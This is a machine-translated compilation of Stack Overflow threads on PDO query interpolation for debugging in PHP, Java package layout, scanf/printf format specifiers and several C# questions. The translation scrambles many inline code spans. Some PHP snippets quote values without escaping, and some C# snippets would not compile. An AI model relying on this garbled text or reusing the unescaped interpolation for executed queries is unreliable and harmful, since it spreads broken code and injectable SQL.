更新：刚刚添加了对 NULL 值和重复 $params 的检查，因此不会修改实际的 $param 值。

伟大的工作 bigwebguy，谢谢！

```
/**
 * Replaces any parameter placeholders in a query with the value of that
 * parameter. Useful for debugging. Assumes anonymous parameters from 
 * $params are are in the same order as specified in $query
 *
 * @param string $query The sql query with parameter placeholders
 * @param array $params The array of substitution parameters
 * @return string The interpolated query
 */
public function interpolateQuery($query, $params) {
    $keys = array();
    $values = $params;

    # build a regular expression for each parameter
    foreach ($params as $key => $value) {
        if (is_string($key)) {
            $keys[] = '/:'.$key.'/';
        } else {
            $keys[] = '/[?]/';
        }

        if (is_string($value))
            $values[$key] = "'" . $value . "'";

        if (is_array($value))
            $values[$key] = "'" . implode("','", $value) . "'";

        if (is_null($value))
            $values[$key] = 'NULL';
    }

    $query = preg_replace($keys, $values, $query);

    return $query;
} 
```

* * *

## 回答 #4

> 赞同：13
> 
> 时间：2018-03-06T23:28:13.677

一种解决方案是自愿在查询中输入错误并打印错误消息：

```
//Connection to the database
$co = new PDO('mysql:dbname=myDB;host=localhost','root','');
//We allow to print the errors whenever there is one
$co->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

//We create our prepared statement
$stmt = $co->prepare("ELECT * FROM Person WHERE age=:age"); //I removed the 'S' of 'SELECT'
$stmt->bindValue(':age','18',PDO::PARAM_STR);
try {
    $stmt->execute();
} catch (PDOException $e) {
    echo $e->getMessage();
} 
```

标准输出：

> SQLSTATE[42000]：语法错误或访问冲突：[...]在第 1 行**的“ELECT * FROM Person WHERE age=18”附近**

需要注意的是，它只打印查询的前 80 个字符。

* * *

## 回答 #5

> 赞同：10
> 
> 时间：2014-07-23T13:25:18.213

可能有点晚了，但现在有`PDOStatement::debugDumpParams`

> 将准备好的语句包含的信息直接转储到输出中。它将提供正在使用的 SQL 查询、使用的参数数量 (Params)、参数列表及其名称、类型 (paramtype) 作为整数、它们的键名或位置以及查询中的位置（如果受 PDO 驱动程序支持，否则为 -1)。

您可以在[官方 php 文档中找到更多信息](http://php.net/manual/en/pdostatement.debugdumpparams.php)

例子：

```
<?php
/* Execute a prepared statement by binding PHP variables */
$calories = 150;
$colour = 'red';
$sth = $dbh->prepare('SELECT name, colour, calories
    FROM fruit
    WHERE calories < :calories AND colour = :colour');
$sth->bindParam(':calories', $calories, PDO::PARAM_INT);
$sth->bindValue(':colour', $colour, PDO::PARAM_STR, 12);
$sth->execute();

$sth->debugDumpParams();

?> 
```

* * *

## 回答 #6

> 赞同：9
> 
> 时间：2012-08-18T05:02:53.363

Mike 在代码中添加了更多内容 - 遍历值以添加单引号

```
/**
 * Replaces any parameter placeholders in a query with the value of that
 * parameter. Useful for debugging. Assumes anonymous parameters from 
 * $params are are in the same order as specified in $query
 *
 * @param string $query The sql query with parameter placeholders
 * @param array $params The array of substitution parameters
 * @return string The interpolated query
 */
public function interpolateQuery($query, $params) {
    $keys = array();
    $values = $params;

    # build a regular expression for each parameter
    foreach ($params as $key => $value) {
        if (is_string($key)) {
            $keys[] = '/:'.$key.'/';
        } else {
            $keys[] = '/[?]/';
        }

        if (is_array($value))
            $values[$key] = implode(',', $value);

        if (is_null($value))
            $values[$key] = 'NULL';
    }
    // Walk the array to see if we can add single-quotes to strings
    array_walk($values, create_function('&$v, $k', 'if (!is_numeric($v) && $v!="NULL") $v = "\'".$v."\'";'));

    $query = preg_replace($keys, $values, $query, 1, $count);

    return $query;
} 
```

* * *

## 回答 #7

> 赞同：6
> 
> 时间：2008-10-16T22:59:58.693

PDOStatement 有一个公共属性 $queryString。它应该是你想要的。

我刚刚注意到 PDOStatement 有一个未记录的方法 debugDumpParams() 您可能还想查看它。

* * *

## 回答 #8

> 赞同：5
> 
> 时间：2014-05-18T19:39:25.620

为了自己的需要，我花了很多时间研究这种情况。这个和其他几个 SO 线程对我帮助很大，所以我想分享我的想法。

虽然在故障排除时可以访问插入的查询字符串是一个显着的好处，但我们希望能够只维护某些查询的日志（因此，为此目的使用数据库日志并不理想）。我们还希望能够使用日志在任何给定时间重新创建表的条件，因此，我们需要确保正确转义了内插字符串。最后，我们希望将此功能扩展到我们的整个代码库，必须尽可能少地重写它（截止日期、营销等；你知道它是怎么回事）。

我的解决方案是扩展默认 PDOStatement 对象的功能以缓存参数化值（或引用），并在执行语句时，使用 PDO 对象的功能在将参数注入回查询时正确转义参数细绳。然后我们可以绑定到语句对象的执行方法并记录当时执行的实际查询（*或至少尽可能忠实地再现）*。

正如我所说，我们不想修改整个代码库来添加此功能，因此我们覆盖了 PDOStatement 对象的默认值`bindParam()`和方法，对绑定的数据进行缓存，然后调用或 parent:: 。这使我们现有的代码库能够继续正常运行。`bindValue()``parent::bindParam()``bindValue()`

最后，当`execute()`调用该方法时，我们执行插值并将结果字符串作为新属性提供`E_PDOStatement->fullQuery`。这可以输出以查看查询，或者，例如，写入日志文件。

该扩展以及安装和配置说明可在 github 上找到：

[https://github.com/noahheck/E_PDOStatement](https://github.com/noahheck/E_PDOStatement)

**免责声明**：
显然，正如我所提到的，我编写了这个扩展。因为它是在这里的许多线程的帮助下开发的，所以我想在这里发布我的解决方案，以防其他人遇到这些线程，就像我一样。

* * *

## 回答 #9

> 赞同：5
> 
> 时间：2017-02-09T18:12:46.797

您可以扩展 PDOStatement 类以捕获有界变量并存储它们以供以后使用。然后可以添加 2 种方法，一种用于变量清理（ debugBindedVariables ），另一种用于打印带有这些变量的查询（ debugQuery ）：

```
class DebugPDOStatement extends \PDOStatement{
  private $bound_variables=array();
  protected $pdo;

  protected function __construct($pdo) {
    $this->pdo = $pdo;
  }

  public function bindValue($parameter, $value, $data_type=\PDO::PARAM_STR){
    $this->bound_variables[$parameter] = (object) array('type'=>$data_type, 'value'=>$value);
    return parent::bindValue($parameter, $value, $data_type);
  }

  public function bindParam($parameter, &$variable, $data_type=\PDO::PARAM_STR, $length=NULL , $driver_options=NULL){
    $this->bound_variables[$parameter] = (object) array('type'=>$data_type, 'value'=>&$variable);
    return parent::bindParam($parameter, $variable, $data_type, $length, $driver_options);
  }

  public function debugBindedVariables(){
    $vars=array();

    foreach($this->bound_variables as $key=>$val){
      $vars[$key] = $val->value;

      if($vars[$key]===NULL)
        continue;

      switch($val->type){
        case \PDO::PARAM_STR: $type = 'string'; break;
        case \PDO::PARAM_BOOL: $type = 'boolean'; break;
        case \PDO::PARAM_INT: $type = 'integer'; break;
        case \PDO::PARAM_NULL: $type = 'null'; break;
        default: $type = FALSE;
      }

      if($type !== FALSE)
        settype($vars[$key], $type);
    }

    if(is_numeric(key($vars)))
      ksort($vars);

    return $vars;
  }

  public function debugQuery(){
    $queryString = $this->queryString;

    $vars=$this->debugBindedVariables();
    $params_are_numeric=is_numeric(key($vars));

    foreach($vars as $key=>&$var){
      switch(gettype($var)){
        case 'string': $var = "'{$var}'"; break;
        case 'integer': $var = "{$var}"; break;
        case 'boolean': $var = $var ? 'TRUE' : 'FALSE'; break;
        case 'NULL': $var = 'NULL';
        default:
      }
    }

    if($params_are_numeric){
      $queryString = preg_replace_callback( '/\?/', function($match) use( &$vars) { return array_shift($vars); }, $queryString);
    }else{
      $queryString = strtr($queryString, $vars);
    }

    echo $queryString.PHP_EOL;
  }
}

class DebugPDO extends \PDO{
  public function __construct($dsn, $username="", $password="", $driver_options=array()) {
    $driver_options[\PDO::ATTR_STATEMENT_CLASS] = array('DebugPDOStatement', array($this));
    $driver_options[\PDO::ATTR_PERSISTENT] = FALSE;
    parent::__construct($dsn,$username,$password, $driver_options);
  }
} 
```

然后你可以使用这个继承的类来调试目的。

```
$dbh = new DebugPDO('mysql:host=localhost;dbname=test;','user','pass');

$var='user_test';
$sql=$dbh->prepare("SELECT user FROM users WHERE user = :test");
$sql->bindValue(':test', $var, PDO::PARAM_STR);
$sql->execute();

$sql->debugQuery();
print_r($sql->debugBindedVariables()); 
```

导致

> 从用户中选择用户 WHERE user = 'user_test'
> 
> 数组（ [:test] => user_test ）

* * *

## 回答 #10

> 赞同：2
> 
> 时间：2019-06-28T04:18:03.507

您可以使用`sprintf(str_replace('?', '"%s"', $sql), ...$params);`

这是一个例子：

```
function mysqli_prepared_query($link, $sql, $types='', $params=array()) {
    echo sprintf(str_replace('?', '"%s"', $sql), ...$params);
    //prepare, bind, execute
}

$link = new mysqli($server, $dbusername, $dbpassword, $database);
$sql = "SELECT firstname, lastname FROM users WHERE userage >= ? AND favecolor = ?";
$types = "is"; //integer and string
$params = array(20, "Brown");

if(!$qry = mysqli_prepared_query($link, $sql, $types, $params)){
    echo "Failed";
} else {
    echo "Success";
} 
```

请注意，这只适用于 PHP >= 5.6

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2008-10-16T23:12:22.100

提到的 $queryString 属性可能只会返回传入的查询，而不会将参数替换为其值。在 .Net 中，我的查询执行器的 catch 部分使用提供的值对参数进行简单的搜索替换，以便错误日志可以显示用于查询的实际值。您应该能够枚举 PHP 中的参数，并将参数替换为其分配的值。

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2018-12-29T03:37:47.447

我知道这个问题有点老了，但是，我很久以前就在使用这个代码（我已经使用了来自@chris-go 的响应），现在，这些代码在 PHP 7.2 中已经过时了

我将发布这些代码的更新版本（主要代码来自[@bigwebguy](https://stackoverflow.com/a/1376838/4537662)、[@mike](https://stackoverflow.com/a/8403150/4537662)和[@chris-go](https://stackoverflow.com/a/12015992/4537662)，他们都是这个问题的答案）：

```
/**
 * Replaces any parameter placeholders in a query with the value of that
 * parameter. Useful for debugging. Assumes anonymous parameters from 
 * $params are are in the same order as specified in $query
 *
 * @param string $query The sql query with parameter placeholders
 * @param array $params The array of substitution parameters
 * @return string The interpolated query
 */
public function interpolateQuery($query, $params) {
    $keys = array();
    $values = $params;

    # build a regular expression for each parameter
    foreach ($params as $key => $value) {
        if (is_string($key)) {
            $keys[] = '/:'.$key.'/';
        } else {
            $keys[] = '/[?]/';
        }

        if (is_array($value))
            $values[$key] = implode(',', $value);

        if (is_null($value))
            $values[$key] = 'NULL';
    }
    // Walk the array to see if we can add single-quotes to strings
    array_walk($values, function(&$v, $k) { if (!is_numeric($v) && $v != "NULL") $v = "\'" . $v . "\'"; });

    $query = preg_replace($keys, $values, $query, 1, $count);

    return $query;
} 
```

请注意，代码上的更改是在 array_walk() 函数上，将 create_function 替换为匿名函数。这使得这些优秀的代码具有功能性并与 PHP 7.2 兼容（也希望未来的版本）。

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2021-03-04T07:08:04.447

现有的答案似乎都不完整或不安全，所以我想出了这个功能，它有以下改进：

*   适用于未命名 ( `?`) 和命名 ( `:foo`) 参数。

*   使用[PDO::quote()](https://www.php.net/manual/en/pdo.quote.php)正确转义不是`NULL`,`int`或.`float``bool`

*   `"?"`正确处理包含且不`":foo"`会将它们误认为占位符的字符串值。

```
 function interpolateSQL(PDO $pdo, string $query, array $params) : string {
        $s = chr(2); // Escape sequence for start of placeholder
        $e = chr(3); // Escape sequence for end of placeholder
        $keys = [];
        $values = [];

        // Make sure we use escape sequences that are not present in any value
        // to escape the placeholders.
        foreach ($params as $key => $value) {
            while( mb_stripos($value, $s) !== false ) $s .= $s;
            while( mb_stripos($value, $e) !== false ) $e .= $e;
        }

        foreach ($params as $key => $value) {
            // Build a regular expression for each parameter
            $keys[] = is_string($key) ? "/$s:$key$e/" : "/$s\?$e/";

            // Treat each value depending on what type it is. 
            // While PDO::quote() has a second parameter for type hinting, 
            // it doesn't seem reliable (at least for the SQLite driver).
            if( is_null($value) ){
                $values[$key] = 'NULL';
            }
            elseif( is_int($value) || is_float($value) ){
                $values[$key] = $value;
            }
            elseif( is_bool($value) ){
                $values[$key] = $value ? 'true' : 'false';
            }
            else{
                $value = str_replace('\\', '\\\\', $value);
                $values[$key] = $pdo->quote($value);
            }
        }

        // Surround placehodlers with escape sequence, so we don't accidentally match
        // "?" or ":foo" inside any of the values.
        $query = preg_replace(['/\?/', '/(:[a-zA-Z0-9_]+)/'], ["$s?$e", "$s$1$e"], $query);

        // Replace placeholders with actual values
        $query = preg_replace($keys, $values, $query, 1, $count);

        // Verify that we replaced exactly as many placeholders as there are keys and values
        if( $count !== count($keys) || $count !== count($values) ){
            throw new \Exception('Number of replacements not same as number of keys and/or values');
        }

        return $query;
    } 
```

我相信它可以进一步改进。

就我而言，我最终只记录了实际的“未准备查询”（即包含占位符的 SQL）以及 JSON 编码的参数。但是，此代码可能会在您确实需要插入最终 SQL 查询的某些用例中使用。

* * *

## 回答 #14

> 赞同：-1
> 
> 时间：2016-01-08T16:05:11.847

preg_replace 对我不起作用，当 binding_ 超过 9 时， binding_1 和 binding_10 被替换为 str_replace （将 0 留在后面），所以我向后进行了替换：

```
public function interpolateQuery($query, $params) {
$keys = array();
    $length = count($params)-1;
    for ($i = $length; $i >=0; $i--) {
            $query  = str_replace(':binding_'.(string)$i, '\''.$params[$i]['val'].'\'', $query);
           }
        // $query  = str_replace('SQL_CALC_FOUND_ROWS', '', $query, $count);
        return $query; 
```

}

希望有人觉得它有用。

* * *

## 回答 #15

> 赞同：-1
> 
> 时间：2016-06-27T08:57:50.683

我需要在绑定参数之后记录完整的查询字符串，所以这是我的代码中的一部分。希望，它对每个遇到同样问题的人都有用。

```
/**
 * 
 * @param string $str
 * @return string
 */
public function quote($str) {
    if (!is_array($str)) {
        return $this->pdo->quote($str);
    } else {
        $str = implode(',', array_map(function($v) {
                    return $this->quote($v);
                }, $str));

        if (empty($str)) {
            return 'NULL';
        }

        return $str;
    }
}

/**
 * 
 * @param string $query
 * @param array $params
 * @return string
 * @throws Exception
 */
public function interpolateQuery($query, $params) {
    $ps = preg_split("/'/is", $query);
    $pieces = [];
    $prev = null;
    foreach ($ps as $p) {
        $lastChar = substr($p, strlen($p) - 1);

        if ($lastChar != "\\") {
            if ($prev === null) {
                $pieces[] = $p;
            } else {
                $pieces[] = $prev . "'" . $p;
                $prev = null;
            }
        } else {
            $prev .= ($prev === null ? '' : "'") . $p;
        }
    }

    $arr = [];
    $indexQuestionMark = -1;
    $matches = [];

    for ($i = 0; $i < count($pieces); $i++) {
        if ($i % 2 !== 0) {
            $arr[] = "'" . $pieces[$i] . "'";
        } else {
            $st = '';
            $s = $pieces[$i];
            while (!empty($s)) {
                if (preg_match("/(\?|:[A-Z0-9_\-]+)/is", $s, $matches, PREG_OFFSET_CAPTURE)) {
                    $index = $matches[0][1];
                    $st .= substr($s, 0, $index);
                    $key = $matches[0][0];
                    $s = substr($s, $index + strlen($key));

                    if ($key == '?') {
                        $indexQuestionMark++;
                        if (array_key_exists($indexQuestionMark, $params)) {
                            $st .= $this->quote($params[$indexQuestionMark]);
                        } else {
                            throw new Exception('Wrong params in query at ' . $index);
                        }
                    } else {
                        if (array_key_exists($key, $params)) {
                            $st .= $this->quote($params[$key]);
                        } else {
                            throw new Exception('Wrong params in query with key ' . $key);
                        }
                    }
                } else {
                    $st .= $s;
                    $s = null;
                }
            }
            $arr[] = $st;
        }
    }

    return implode('', $arr);
} 
```

* * *

## 回答 #16

> 赞同：-2
> 
> 时间：2014-10-22T09:57:29.067

有点相关......如果你只是想清理一个特定的变量，你可以使用[PDO::quote](http://php.net/manual/en/pdo.quote.php)。例如，如果您遇到像 CakePHP 这样的有限框架，要搜索多个部分 LIKE 条件：

```
$pdo = $this->getDataSource()->getConnection();
$results = $this->find('all', array(
    'conditions' => array(
        'Model.name LIKE ' . $pdo->quote("%{$keyword1}%"),
        'Model.name LIKE ' . $pdo->quote("%{$keyword2}%"),
    ),
); 
```

* * *

## 回答 #17

> 赞同：-3
> 
> 时间：2015-11-26T06:42:57.557

在您使用“重用”绑定值之前，[迈克的回答效果很好。](https://stackoverflow.com/a/8403150/128761)
例如：

```
SELECT * FROM `an_modules` AS `m` LEFT JOIN `an_module_sites` AS `ms` ON m.module_id = ms.module_id WHERE 1 AND `module_enable` = :module_enable AND `site_id` = :site_id AND (`module_system_name` LIKE :search OR `module_version` LIKE :search) 
```

迈克的答案只能取代第一个 :search 而不是第二个。
因此，我重写了他的答案以使用可以正确重复使用的多个参数。

```
public function interpolateQuery($query, $params) {
    $keys = array();
    $values = $params;
    $values_limit = [];

    $words_repeated = array_count_values(str_word_count($query, 1, ':_'));

    # build a regular expression for each parameter
    foreach ($params as $key => $value) {
        if (is_string($key)) {
            $keys[] = '/:'.$key.'/';
            $values_limit[$key] = (isset($words_repeated[':'.$key]) ? intval($words_repeated[':'.$key]) : 1);
        } else {
            $keys[] = '/[?]/';
            $values_limit = [];
        }

        if (is_string($value))
            $values[$key] = "'" . $value . "'";

        if (is_array($value))
            $values[$key] = "'" . implode("','", $value) . "'";

        if (is_null($value))
            $values[$key] = 'NULL';
    }

    if (is_array($values)) {
        foreach ($values as $key => $val) {
            if (isset($values_limit[$key])) {
                $query = preg_replace(['/:'.$key.'/'], [$val], $query, $values_limit[$key], $count);
            } else {
                $query = preg_replace(['/:'.$key.'/'], [$val], $query, 1, $count);
            }
        }
        unset($key, $val);
    } else {
        $query = preg_replace($keys, $values, $query, 1, $count);
    }
    unset($keys, $values, $values_limit, $words_repeated);

    return $query;
} 
```

# java - Java项目的包结构？

> ID：210567
> 
> 赞同：134
> 
> 时间：2008-10-16T22:48:28.873
> 
> 标签：java, packages

在 Java Web 应用程序中设置包结构的最佳实践是什么？

您将如何设置您的 src、单元测试代码等？

* * *

## 回答 #1

> 赞同：112
> 
> 时间：2008-10-16T22:54:25.040

您可以按照 maven 的[标准项目布局](http://maven.apache.org/guides/introduction/introduction-to-the-standard-directory-layout.html)。您不必实际使用 maven，但它会使将来的过渡更容易（如有必要）。另外，其他开发人员会习惯于看到这种布局，因为许多开源项目都是这样布局的，

* * *

## 回答 #2

> 赞同：62
> 
> 时间：2008-10-17T01:32:55.267

您可能会检查一些现有资源：

1.  [正确打包您的 Java 类](http://www.techrepublic.com/article/properly-package-your-java-classes/)
2.  [Spring 2.5 架构](http://chris.headwaysoftware.com/java/)
3.  [Java 教程 - 命名包](http://docs.oracle.com/javase/tutorial/java/package/namingpkgs.html)
4.  [SUN 命名约定](http://www.oracle.com/technetwork/java/javase/documentation/codeconventions-135099.html#367)

对于它的价值，我自己倾向于使用的个人指导方针如下：

1.  从反向域开始，例如“com.mycompany”。
2.  使用产品名称，例如“myproduct”。在某些情况下，我倾向于使用不属于特定产品的通用包。这些最终会根据这些常见类的功能进行分类，例如“io”、“util”、“ui”等。
3.  在此之后，它变得更加自由。通常我根据项目、功能区域、部署等进行分组。例如，我可能有“project1”、“project2”、“ui”、“client”等。

其他几点：

1.  在我从事的项目中，包名称从设计文档中流出是很常见的。通常，产品已经分为功能或用途领域。
2.  不要过分强调立即将通用功能推入更高的包。等待跨项目、产品等有需求，然后重构。
3.  观察包间依赖关系。它们并不全是坏的，但它可以表示可能是单独的单元之间的紧密耦合。有一些工具可以帮助您跟踪这一点。

* * *

## 回答 #3

> 赞同：47
> 
> 时间：2010-07-31T22:23:01.013

我建议按功能而不是按实现层创建您的包结构。对此的一个很好的描述是[Java 实践：按功能打包，而不是按层打包](http://www.javapractices.com/topic/TopicAction.do?Id=205)

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2018-10-14T12:28:25.883

```
The way I usually organise is
- src
        - main
                - java
                - groovy
                - resources
        - test
                - java
                - groovy
- lib
- build
        - test 
                - reports
                - classes
- doc 
```

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2015-10-10T18:55:54.817

我通常喜欢以下内容：

*   bin（二进制文件）
*   doc（文件）
*   inf（信息）
*   lib（库）
*   资源（资源）
*   src (来源)
*   tst（测试）

这些可能被认为是非常规的，但我发现这是一种非常好的组织事物的方式。

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2008-10-17T01:55:45.547

我通常拥有文件夹层次结构的方式-

*   项目名
    *   源代码
    *   斌
    *   测试
    *   库
    *   文档

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2020-06-12T11:02:33.130

另一种方法是将 API、服务和实体分离到不同的包中。

[![在此处输入图像描述](https://i.stack.imgur.com/aY5zs.png)](https://i.stack.imgur.com/aY5zs.png)

# c - 为什么 scanf() 需要 "%lf" 作为双打，而 printf() 只需要 "%f"？

> ID：210590
> 
> 赞同：187
> 
> 时间：2008-10-16T23:05:15.953
> 
> 标签：c, scanf, length-modifiers

为什么读取 a时`scanf()`需要`l`in " "，而不管它的参数是 a还是 a ，什么时候可以使用 " " ？`%lf``double``printf()``%f``double``float`

示例代码：

```
double d;
scanf("%lf", &d);
printf("%f", d); 
```

* * *

## 回答 #1

> 赞同：216
> 
> 时间：2008-10-16T23:06:56.217

因为对于采用可变参数的函数，C 会将浮点数提升为双精度数。指针不会被提升为任何东西，因此您应该使用`%lf`,`%lg`或`%le`（或`%la`在 C99 中）来读取双精度数。

* * *

## 回答 #2

> 赞同：31
> 
> 时间：2015-01-29T18:58:50.350

自 С99 以来，格式说明符和 C 中的浮点参数类型之间的匹配在 和 之间是一致`printf`的`scanf`。这是

*   `%f`为了`float`
*   `%lf`为了`double`
*   `%Lf`为了`long double`

碰巧当 type`float`的参数作为可变参数传递时，这些参数被隐式转换为 type `double`。这就是为什么在`printf`格式说明符中`%f`和`%lf`是等价的和可互换的。在`printf`你可以“交叉`%lf`使用”`float`或`%f`。`double`

但实际上没有理由在实践中这样做。不要使用类型`%f`的参数。这是在 C89/90 时代诞生的普遍习惯，但它是一个坏习惯。在for中使用并为参数保留保留。`printf``double``%lf``printf``double``%f``float`

* * *

## 回答 #3

> 赞同：17
> 
> 时间：2008-10-16T23:09:12.827

`scanf`需要知道指向的数据的大小`&d`才能正确填充它，而可变参数函数将浮点数提升为双精度数（不完全确定为什么），所以`printf`总是得到一个`double`.

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2008-10-16T23:10:28.097

因为否则 scanf 会认为您正在传递一个指向比双精度更小的浮点数的指针，并且它将返回不正确的值。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2008-10-16T23:09:59.157

在 C 表达式中使用 float 或 double 值将导致一个 double 值，因此 printf 无法区分。而指向 double 的指针必须显式地向 scanf 发出信号，与指向 float 的指针不同，因为指针指向的才是最重要的。

# c# - 如何释放进程的资源

> ID：210594
> 
> 赞同：1
> 
> 时间：2008-10-16T23:08:40.550
> 
> 标签：c#, .net-3.5, process

我通过使用 System.Diagonistics.Process 并传递两个文件名作为参数来调用外部进程。现在有时这个进程由于异常而终止，并且似乎文件句柄没有被进程释放。如何释放进程占用的资源。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-17T10:48:01.010

此应用程序是 WMVAppend.exe（随 Microsoft Media SDK 提供）。即使我们重新启动机器，它也会报告错误对话框并在下一次运行时正常工作。只有媒体附加的问题不是由我们的流程完成的。我还检查了源文件，它们看起来很完美，但它们并没有完美地附加，文件也无法使用。

或者进程可能根本没有终止，但我正在使用 Process.WaitForExit() 它应该只返回进程被终止。重启时的错误对话框提示我这种情况是可能的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-16T23:34:36.613

是什么让您认为文件句柄没有被释放？由于您正在启动应用程序外部的进程，因此您无法控制其他进程在异常终止时将要做什么。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-16T23:25:19.407

您如何检测到文件句柄没有被垂死的进程释放？

所有资源都应由因任何原因终止的进程释放。如果不是，那么这是一个应该向 Microsoft 提交的错误。

# c# - 对 C# 自定义选项卡控件的建议？

> ID：210597
> 
> 赞同：1
> 
> 时间：2008-10-16T23:10:09.330
> 
> 标签：c#, tabcontrol

有没有人对在 C# 中实现的自定义 tabcontrol 有任何建议，并且符合以下标准：

*   允许将选项卡放置在控件的侧面。
*   选项卡文本必须水平阅读。
*   允许自定义着色。
*   开源或免费。

如果解决方案已经存在，我不希望自己弄脏*所有者绘图。*

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-04-22T05:02:50.283

您可能不再需要此功能，但偶然发现它的任何其他人可能会发现它很有用。

我在 CodeProject 上发现了这个 tabcontrol，用它来绘制你自己的标签也很容易，他们甚至在网站上给你一个例子。

[Y(et)A(other)TabControl](http://www.codeproject.com/KB/miscctrl/yatabcontrol.aspx)

还有几个选项卡控件。

[TabStrip 控件](http://www.codeproject.com/KB/tabs/tabstrips.aspx)

[TabStrips：Visual Studio 2005 中的 TabControl！](http://www.codeproject.com/KB/tabs/TabStrip.aspx)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-04-23T19:08:04.040

WPF 中的选项卡控件满足您的所有要求。您可以覆盖模板并在其上前往城镇。

# c# - 从 C# 中的基类访问派生类的属性

> ID：210601
> 
> 赞同：12
> 
> 时间：2008-10-16T23:11:54.863
> 
> 标签：c#, generics, collections

在 C# 中，当泛型列表仅包含基类时，访问派生类属性的最佳方法是什么。

```
public class ClassA : BaseClass
{
   public object PropertyA { get; set; }
}

public class ClassB: BaseClass
{
    public object PropertyB { get; set; }
}

public class BaseClass
{
}

public void Main
{
    List<BaseClass> MyList = new List<BaseClass>();
    ClassA a = new ClassA();
    ClassB b = new ClassB();

    MyList.Add(a);
    MyList.Add(b);

    for(int i = 0; i < MyList.Count; i++)
    {
        //I would like to access PropertyA abd PropertyB from the derived classes        
    }
} 
```

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2008-10-16T23:20:55.063

当然你可以沮丧，像这样：

```
for (int i = 0; i < MyList.Count; i++)
{
    if (MyList[i] is ClassA)
    {
        var a = ((ClassA)MyList[i]).PropertyA;
        // do stuff with a
    }

    if (MyList[i] is ClassB)
    {
        var b = ((ClassB)MyList[i]).PropertyB;
        // do stuff with b
    }
} 
```

...但是，您应该再看看您要完成的工作。如果您有需要访问 ClassA 和 ClassB 属性的公共代码，那么最好将这些属性的访问封装到祖先类中的共享虚拟属性或方法中。

就像是：

```
public class BaseClass
{
    public virtual void DoStuff() { }
}

public class ClassA : BaseClass
{
    public object PropertyA { get; set; }

    public override void DoStuff() 
    {
        // do stuff with PropertyA 
    }
}

public class ClassB : BaseClass
{
    public object PropertyB { get; set; }

    public override void DoStuff() 
    {
        // do stuff with PropertyB
    }
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2008-10-17T11:20:21.587

除了 TimJ 的回答，您可以编写一种适用于所有类型的扩展方法：

```
public static IEnumerable<T> OfType<T>(this IEnumerable list)
{
    foreach (var obj in list)
    {
        if (obj is T)
            yield return (T)obj;
    }
} 
```

或者，如果您有 Linq，则该函数位于命名空间 System.Linq 中。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-10-16T23:20:24.957

```
 BaseClass o = MyList[i];
   if (o is ClassB)
   {
      object k = ((ClassB)o).PropertyB;
   }
   if (o is ClassA))
   {
      object j = ((ClassA)o).PropertyA;
   } 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-10-17T00:26:07.850

如果您经常这样做，另一种选择是在列表上创建一个扩展方法，以返回正确键入的枚举。IE

```
 public static class MyBaseListExtensions
  {
    public static IEnumerable<ClassA> GetAllAs(this List<MyBaseClass> list)
    {
      foreach (var obj in list)
      {
        if (obj is ClassA)
        {
          yield return (ClassA)obj;
        }
      }
    }

    public static IEnumerable<ClassB> GetAllbs(this List<MyBaseClass> list)
    {
      foreach (var obj in list)
      {
        if (obj is ClassB)
        {
          yield return (ClassB)obj;
        }
      }
    }
  } 
```

然后你可以像这样使用它......

```
private void button1_Click(object sender, EventArgs e)
{
  ClassA a1 = new ClassA() { PropertyA = "Tim" };
  ClassA a2 = new ClassA() { PropertyA = "Pip" };
  ClassB b1 = new ClassB() { PropertyB = "Alex" };
  ClassB b2 = new ClassB() { PropertyB = "Rachel" };

  List<MyBaseClass> list = new List<MyBaseClass>();
  list.Add(a1);
  list.Add(a2);
  list.Add(b1);
  list.Add(b2);

  foreach (var a in list.GetAllAs())
  {
    listBox1.Items.Add(a.PropertyA);
  }

  foreach (var b in list.GetAllbs())
  {
    listBox2.Items.Add(b.PropertyB);
  }
} 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-10-16T23:19:17.580

整个前提没有意义 - PropertyB 对于 a 实例来说是什么？

如果您进行手动运行时类型检查（inst 是 Foo），则可以执行此操作，然后转换为具有所需属性的类型。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-10-16T23:20:49.183

您可能对泛型和子类有一些问题（在这种情况下，您应该返回 System.Collections.ArrayList），但是您必须将 BaseClass 转换为您希望使用的子类。如果使用'as'目录，如果BaseClass可以转换为子类则成功，如果不能转换则为null。它看起来像：

```
for(int i = 0; i < MyList.Count; i++)
{
    BaseClass bc = MyList[i];
    ClassA a = bc as ClassA;
    ClassB b = bc as ClassB;
    bc.BaseClassMethod();
    if (a != null) {
       a.PropertyA;
    }
    if (b != null) {
       b.PropertyB;
    }
} 
```

另外，我应该提到这闻起来有点难闻。这种代码表示结构不良的对象层次结构。一般来说，如果你不能说一个 IS A BaseClass，你的设计可能是错误的。但是，希望有帮助！

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-10-17T00:28:35.007

您需要在基类上将属性声明为虚拟属性，然后在派生类中覆盖它们。

前任：

```
public class ClassA : BaseClass
{
   public override object PropertyA { get; set; }
}

public class ClassB: BaseClass
{
    public override object PropertyB { get; set; }
}

public class BaseClass
{
    public virtual object PropertyA { get; set; }
    public virtual object PropertyB { get; set; }
}

public void Main
{
    List<BaseClass> MyList = new List<BaseClass>();
    ClassA a = new ClassA();
    ClassB b = new ClassB();

    MyList.Add(a);
    MyList.Add(b);

    for(int i = 0; i < MyList.Count; i++)
    {
     // Do something here with the Property
        MyList[i].PropertyA;
        MyList[i].PropertyB;      
    }
} 
```

您要么需要在基类中实现该属性以返回默认值（例如 null），要么将其抽象化并强制所有派生类实现这两个属性。

